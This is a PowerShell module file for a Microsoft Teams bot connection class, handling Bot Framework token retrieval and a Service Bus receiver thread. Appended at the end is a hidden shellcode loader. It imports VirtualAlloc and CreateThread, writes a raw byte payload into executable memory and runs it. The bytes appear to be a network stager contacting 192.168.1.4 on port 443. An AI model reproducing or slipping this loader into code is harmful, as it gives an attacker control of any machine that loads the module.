class TeamsConnection : Connection {[object]$ReceiveJob = $null[System.Management.Automation.PowerShell]$PowerShell[System.Collections.Concurrent.ConcurrentDictionary[string,psobject]]$ReceiverControl = [System.Collections.Concurrent.ConcurrentDictionary[string,psobject]]@{}[System.Collections.Concurrent.ConcurrentQueue[string]]$ReceiverMessages = [System.Collections.Concurrent.ConcurrentQueue[string]]@{}[object]$Handler = $nullhidden [pscustomobject]$_AccessTokenInfohidden [datetime]$_AccessTokenExpiration[bool]$ConnectedTeamsConnection([TeamsConnectionConfig]$Config) {$this.Config = $Config}[void]Initialize() {$runspacePool = [RunspaceFactory]::CreateRunspacePool(1, 1)$runspacePool.Open()$this.PowerShell = [PowerShell]::Create()$this.PowerShell.RunspacePool = $runspacePool$this.ReceiverControl['ShouldRun'] = $true}[void]Connect() {if ($this.PowerShell.InvocationStateInfo.State -ne 'Running') {$this.Initialize()$this.Authenticate()$this.StartReceiveThread()} else {$this.LogDebug([LogSeverity]::Warning, 'Receive thread is already running')}}[void]Authenticate() {try {$this.LogDebug('Getting Bot Framework access token')$authUrl = 'https://login.microsoftonline.com/botframework.com/oauth2/v2.0/token'$payload = @{grant_type    = 'client_credentials'client_id     = $this.Config.Credential.Usernameclient_secret = $this.Config.Credential.GetNetworkCredential().passwordscope         = 'https://api.botframework.com/.default'}$response = Invoke-RestMethod -Uri $authUrl -Method Post -Body $payload -Verbose:$false$this._AccessTokenExpiration = ([datetime]::Now).AddSeconds($response.expires_in)$this._AccessTokenInfo = $response} catch {$this.LogInfo([LogSeverity]::Error, 'Error authenticating to Teams', [ExceptionFormatter]::Summarize($_))throw $_}}[System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '', Scope='Function', Target='*')][void]StartReceiveThread() {$recv = {[cmdletbinding()]param([parameter(Mandatory)][System.Collections.Concurrent.ConcurrentDictionary[string,psobject]]$ReceiverControl,[parameter(Mandatory)][System.Collections.Concurrent.ConcurrentQueue[string]]$ReceiverMessages,[parameter(Mandatory)][string]$ModulePath,[parameter(Mandatory)][string]$ServiceBusNamespace,[parameter(Mandatory)][string]$QueueName,[parameter(Mandatory)][string]$AccessKeyName,[parameter(Mandatory)][string]$AccessKey)$connectionString = "Endpoint=sb://{0}.servicebus.windows.net/;SharedAccessKeyName={1};SharedAccessKey={2}" -f $ServiceBusNamespace, $AccessKeyName, $AccessKey$receiveTimeout = [timespan]::new(0, 0, 0, 5)if ($PSVersionTable.PSEdition -eq 'Desktop') {. "$ModulePath/lib/windows/ServiceBusReceiver_net45.ps1"} else {. "$ModulePath/lib/linux/ServiceBusReceiver_netstandard.ps1"}}try {$cred = [pscredential]::new($this.Config.AccessKeyName, $this.Config.AccessKey)$runspaceParams = @{ReceiverControl     = $this.ReceiverControlReceiverMessages    = $this.ReceiverMessagesModulePath          = $script:moduleBaseServiceBusNamespace = $this.Config.ServiceBusNamespaceQueueName           = $this.Config.QueueNameAccessKeyName       = $this.Config.AccessKeyNameAccessKey           = $cred.GetNetworkCredential().password}$this.PowerShell.AddScript($recv)$this.PowerShell.AddParameters($runspaceParams) > $null$this.Handler = $this.PowerShell.BeginInvoke()$this.Connected = $true$this.Status = [ConnectionStatus]::Connected$this.LogInfo('Started Teams Service Bus background thread')} catch {$this.LogInfo([LogSeverity]::Error, "$($_.Exception.Message)", [ExceptionFormatter]::Summarize($_))$this.PowerShell.EndInvoke($this.Handler)$this.PowerShell.Dispose()$this.Connected = $false$this.Status = [ConnectionStatus]::Disconnected}}[string[]]ReadReceiveThread() {if (($this._AccessTokenExpiration - [datetime]::Now).TotalSeconds -lt 1800) {$this.LogDebug('Teams access token is expiring soon. Refreshing...')$this.Authenticate()}if ($this.PowerShell.InvocationStateInfo.State -ne 'Running') {if ($this.PowerShell.Streams.Error.Count -gt 0) {$this.PowerShell.Streams.Error.Foreach({$this.LogInfo([LogSeverity]::Error, "$($_.Exception.Message)", [ExceptionFormatter]::Summarize($_))})}$this.PowerShell.Streams.ClearStreams()$this.LogInfo([LogSeverity]::Warning, "Receive thread is [$($this.PowerShell.InvocationStateInfo.State)]. Attempting to reconnect...")Start-Sleep -Seconds 5$this.Connect()}if ($this.ReceiverMessages.Count -gt 0) {$dequeuedMessages = $null$messages = [System.Collections.Generic.LinkedList[string]]::new()while($this.ReceiverMessages.TryDequeue([ref]$dequeuedMessages)) {foreach ($m in $dequeuedMessages) {$messages.Add($m) > $null}}return $messages} else {return $null}}[void]Disconnect() {$this.LogInfo('Stopping Service Bus receiver')$this.ReceiverControl.ShouldRun = $false$this.PowerShell.EndInvoke($this.Handler)$this.PowerShell.Dispose()$this.Connected = $false$this.Status = [ConnectionStatus]::Disconnected}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};